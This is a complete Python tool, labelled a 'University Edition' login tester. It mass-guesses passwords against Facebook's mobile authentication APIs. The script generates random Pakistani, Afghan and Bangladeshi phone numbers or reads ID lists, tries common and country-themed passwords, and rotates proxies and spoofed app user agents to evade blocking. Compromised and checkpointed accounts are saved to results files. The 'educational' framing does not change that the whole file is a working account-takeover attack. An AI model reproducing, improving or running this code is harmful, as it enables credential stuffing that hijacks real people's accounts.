#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Facebook Login Tester - Final University Edition
Compatible with Linux & Termux
Author: Hamayon Khan (Optimized for Educational Use)
"""

import os
import sys
import time
import random
import string
import uuid
import json
import threading
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ---------- Auto install dependencies ----------
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system('pip install requests urllib3')
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

# ========== CONSTANTS ==========
MAX_WORKERS = 20                # کاهش برای جلوگیری از مسدودیت
REQUEST_TIMEOUT = 20
MIN_DELAY = 1                   # تاخیر بین درخواست‌ها (ثانیه)
MAX_DELAY = 3
PROXY_FILE = ".prox.txt"
# مسیر ذخیره نتایج (سازگار با لینوکس و ترمکس)
OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "AWM-Results")
os.makedirs(OUTPUT_DIR, exist_ok=True)

# لاک‌های ترد
lock = threading.Lock()
ok_list = []
cp_list = []
twofa_list = []
loop_counter = 0
total_targets = 0

# ========== COLORS ==========
R = "\033[1;91m"
G = "\033[1;92m"
Y = "\033[1;93m"
B = "\033[1;94m"
P = "\033[1;95m"
C = "\033[1;96m"
W = "\033[1;97m"
N = "\033[0m"

# ========== ENHANCED USER-AGENT GENERATOR ==========
class FBUserAgent:
    """سازنده User-Agent های واقعی فیسبوک"""
    
    MODELS_2025 = [
        "SM-S928B", "SM-S918B", "Pixel 9 Pro", "Pixel 8", "CPH2609",
        "RMX3888", "Xiaomi 14 Ultra", "OnePlus 12", "V2324A", "SM-F956B"
    ]
    ANDROID_VERS = ["13", "14", "15"]
    BUILDS = ["UKQ1.240227.001", "AP3A.240617.008", "UP1A.240105.002"]
    FB_APPS = ["com.facebook.katana", "com.facebook.lite", "com.facebook.orca"]
    LOCALES = ["en_US", "en_GB", "ar_AR", "fr_FR"]
    
    @classmethod
    def get_dalvik(cls):
        model = random.choice(cls.MODELS_2025)
        ver = random.choice(cls.ANDROID_VERS)
        build = random.choice(cls.BUILDS)
        fb_app = random.choice(cls.FB_APPS)
        fbav = f"{random.randint(450,550)}.0.0.{random.randint(10,99)}"
        fbbv = str(random.randint(500000000,700000000))
        locale = random.choice(cls.LOCALES)
        return (f"Dalvik/2.1.0 (Linux; U; Android {ver}; {model} Build/{build}) "
                f"[FBAN/FB4A;FBAV/{fbav};FBPN/{fb_app};FBLC/{locale};FBBV/{fbbv};"
                f"FBCR/null;FBMF/{model.split()[0]};FBBD/{model};FBDV/{model};"
                f"FBSV/{ver};FBCA/arm64-v8a:null;FBDM/{{density=2.0,width=1080,height=2400}};]")
    
    @classmethod
    def get_webview(cls):
        model = random.choice(cls.MODELS_2025)
        ver = random.choice(cls.ANDROID_VERS)
        build = random.choice(cls.BUILDS)
        chrome = random.randint(120,135)
        return (f"Mozilla/5.0 (Linux; Android {ver}; {model} Build/{build}; wv) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome}.0.0.0 "
                f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{random.randint(500,600)}.0.0.1;]")
    
    @classmethod
    def random(cls):
        return random.choice([cls.get_dalvik, cls.get_webview])()

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current = 0
        self.lock = threading.Lock()
        self.load()
    
    def load(self):
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    def get(self):
        if not self.proxies:
            return None
        with self.lock:
            proxy = self.proxies[self.current % len(self.proxies)]
            self.current += 1
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def rotate(self):
        with self.lock:
            self.current += 1

proxy_manager = ProxyManager()

# ========== FACEBOOK LOGIN METHODS ==========
class FacebookAPI:
    """کلاس اصلی برای ارتباط با API فیسبوک"""
    
    B_API_URL = "https://b-api.facebook.com/method/auth.login"
    B_GRAPH_URL = "https://b-graph.facebook.com/auth/login"
    ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    
    @staticmethod
    def _get_session():
        session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500,502,503,504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session
    
    @classmethod
    def login_b_api(cls, email, password):
        """روش کلاسیک b-api"""
        session = cls._get_session()
        proxy = proxy_manager.get()
        if proxy:
            session.proxies.update(proxy)
        
        device_id = str(uuid.uuid4())
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': cls.ACCESS_TOKEN,
            'email': email,
            'password': password,
            'format': 'json',
            'device_id': device_id,
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'locale': random.choice(['en_US','ar_AR']),
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        }
        headers = {
            'User-Agent': FBUserAgent.random(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Device-ID': device_id,
        }
        try:
            resp = session.post(cls.B_API_URL, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
            result = resp.json()
            if 'session_key' in result:
                return ('ok', result)
            elif 'www.facebook.com' in str(result.get('error',{}).get('message','')):
                return ('cp', result)
            else:
                return ('fail', result)
        except:
            return ('error', None)
    
    @classmethod
    def login_b_graph(cls, email, password):
        """روش جدید b-graph"""
        session = cls._get_session()
        proxy = proxy_manager.get()
        if proxy:
            session.proxies.update(proxy)
        
        device_id = str(uuid.uuid4())
        data = {
            'email': email,
            'password': password,
            'device_id': device_id,
            'format': 'json',
            'generate_session_cookies': '1',
            'locale': 'en_US',
            'fb_api_req_friendly_name': 'authenticate',
        }
        headers = {
            'User-Agent': FBUserAgent.random(),
            'Authorization': f'OAuth {cls.ACCESS_TOKEN}',
            'X-FB-Device-ID': device_id,
        }
        try:
            resp = session.post(cls.B_GRAPH_URL, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
            result = resp.json()
            if 'session_key' in result:
                return ('ok', result)
            elif 'checkpoint' in str(result.get('error',{})):
                return ('cp', result)
            else:
                return ('fail', result)
        except:
            return ('error', None)

# ========== CORE CRACKING FUNCTION ==========
def crack(identifier, passwords, method='b_api', show_cp=False):
    global loop_counter, ok_list, cp_list, total_targets
    
    for pwd in passwords:
        # تاخیر تصادفی برای جلوگیری از مسدودیت
        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
        
        if method == 'b_api':
            status, data = FacebookAPI.login_b_api(identifier, pwd)
        else:
            status, data = FacebookAPI.login_b_graph(identifier, pwd)
        
        if status == 'ok':
            uid = str(data.get('uid', identifier))
            with lock:
                if uid not in ok_list:
                    ok_list.append(uid)
                    print(f"\r{G}[LIVE-{method.upper()}] {uid} | {pwd}{N}")
                    with open(f"{OUTPUT_DIR}/AWM-OK.txt", "a") as f:
                        f.write(f"{uid}|{pwd}|{datetime.now()}\n")
            return True
        
        elif status == 'cp' and show_cp:
            uid = str(data.get('uid', identifier))
            with lock:
                if uid not in cp_list:
                    cp_list.append(uid)
                    print(f"\r{Y}[CP-{method.upper()}] {uid} | {pwd}{N}")
                    with open(f"{OUTPUT_DIR}/AWM-CP.txt", "a") as f:
                        f.write(f"{uid}|{pwd}|{datetime.now()}\n")
            # ادامه می‌دهیم برای رمزهای دیگر شاید موفق شود
            continue
        else:
            continue
    
    with lock:
        loop_counter += 1
        if total_targets:
            percent = round(loop_counter * 100 / total_targets, 2)
            sys.stdout.write(f"\r{W}[{method.upper()}] Progress: {loop_counter}/{total_targets} ({percent}%) | OK:{len(ok_list)} CP:{len(cp_list)}{N}")
            sys.stdout.flush()
    return False

# ========== NUMBER GENERATION ==========
def generate_numbers(code, count):
    return [code + ''.join(random.choices(string.digits, k=random.randint(7,10))) for _ in range(count)]

# ========== FILE PROCESSING ==========
def process_file(filepath, passlist, method='b_api', show_cp=False):
    global total_targets, loop_counter, ok_list, cp_list
    try:
        with open(filepath, 'r') as f:
            lines = [line.strip().split('|')[0] for line in f if line.strip()]
    except Exception as e:
        print(f"{R}[!] Error reading file: {e}{N}")
        return
    
    total_targets = len(lines)
    loop_counter = 0
    ok_list.clear()
    cp_list.clear()
    
    print(f"{G}[+] Total IDs: {total_targets}{N}")
    print(f"{G}[+] Method: {method.upper()}{N}")
    print(f"{W}[+] Starting... (Ctrl+C to stop){N}")
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(crack, line, passlist, method, show_cp): line for line in lines}
        for _ in as_completed(futures):
            pass
    
    print(f"\n{G}[+] Done. OK: {len(ok_list)} | CP: {len(cp_list)}{N}")

def random_cloning(code, count, passlist, method='b_api', show_cp=False):
    global total_targets, loop_counter, ok_list, cp_list
    numbers = generate_numbers(code, count)
    total_targets = len(numbers)
    loop_counter = 0
    ok_list.clear()
    cp_list.clear()
    
    print(f"{G}[+] Country: {code}{N}")
    print(f"{G}[+] Total numbers: {total_targets}{N}")
    print(f"{W}[+] Starting...{N}")
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(crack, num, passlist, method, show_cp): num for num in numbers}
        for _ in as_completed(futures):
            pass
    
    print(f"\n{G}[+] Done. OK: {len(ok_list)} | CP: {len(cp_list)}{N}")

# ========== MENU ==========
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""{G}
╔══════════════════════════════════════════════════════════╗
║     █████╗ ██╗    ██╗███╗   ███╗                         ║
║    ██╔══██╗██║    ██║████╗ ████║    Facebook Login      ║
║    ███████║██║ █╗ ██║██╔████╔██║    Tester - Final      ║
║    ██╔══██║██║███╗██║██║╚██╔╝██║    University Edition  ║
║    ██║  ██║╚███╔███╔╝██║ ╚═╝ ██║                         ║
║    ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝     ╚═╝                         ║
╠══════════════════════════════════════════════════════════╣
║ [✓] Compatible: Linux & Termux                          ║
║ [✓] Methods: B-API | B-Graph                           ║
║ [✓] Results saved in: {OUTPUT_DIR}{G}                    ║
╚══════════════════════════════════════════════════════════╝{N}""")

def main():
    while True:
        clear_screen()
        banner()
        print(f"{C}┌────────────────────────────────────────────┐")
        print(f"│ {W}1. {C}Crack from file                        │")
        print(f"│ {W}2. {C}Random cloning (B-API)                 │")
        print(f"│ {W}3. {C}Random cloning (B-Graph)               │")
        print(f"│ {W}0. {C}Exit                                   │")
        print(f"└────────────────────────────────────────────┘{N}")
        
        choice = input(f"{G}[?] Select: {N}").strip()
        
        if choice == '1':
            fpath = input(f"{G}[?] File path: {N}").strip()
            if not os.path.exists(fpath):
                print(f"{R}[!] Not found!{N}")
                time.sleep(1)
                continue
            print(f"{W}Password options:\n1. Auto common\n2. Manual{N}")
            p_opt = input(f"{G}[?]: {N}")
            if p_opt == '1':
                passlist = ['123456','password','123456789','qwerty','abc123','111111','123123']
            else:
                count = int(input(f"{G}[?] How many passwords? {N}"))
                passlist = [input(f"Pass {i+1}: ") for i in range(count)]
            method = input(f"{G}[?] Method (1=b-api, 2=b-graph): {N}")
            method = 'b_api' if method == '1' else 'b_graph'
            show = input(f"{G}[?] Show CP? (y/n): {N}").lower() == 'y'
            process_file(fpath, passlist, method, show)
            input(f"{W}[Enter to continue]{N}")
        
        elif choice in ['2','3']:
            print(f"{W}Countries:\n1. Pakistan (923xx)\n2. Afghanistan (937x)\n3. Bangladesh (880xx)\n4. Custom{N}")
            cc = input(f"{G}[?]: {N}")
            if cc == '1':
                code = input(f"Enter code (e.g., 92302): ")
                passlist = ['123456','pakistan','karachi','pak123']
            elif cc == '2':
                code = input(f"Enter code (e.g., 9370): ")
                passlist = ['123456','afghan123','kabul123','afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰','Afghan1234','kabul1234','Kabul123','Kabul1234']
            elif cc == '3':
                code = input(f"Enter code (e.g., 88017): ")
                passlist = ['123456','bangladesh','dhaka123']
            else:
                code = input(f"Enter code: ")
                passlist = ['123456','password']
            try:
                limit = int(input(f"Number of IDs (default 500): ") or "500")
            except:
                limit = 500
            show = input(f"Show CP? (y/n): ").lower() == 'y'
            method = 'b_api' if choice == '2' else 'b_graph'
            random_cloning(code, limit, passlist, method, show)
            input(f"{W}[Enter to continue]{N}")
        
        elif choice == '0':
            print(f"{G}[+] Goodbye!{N}")
            sys.exit(0)
        else:
            print(f"{R}[!] Invalid!{N}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user{N}")
        sys.exit(0)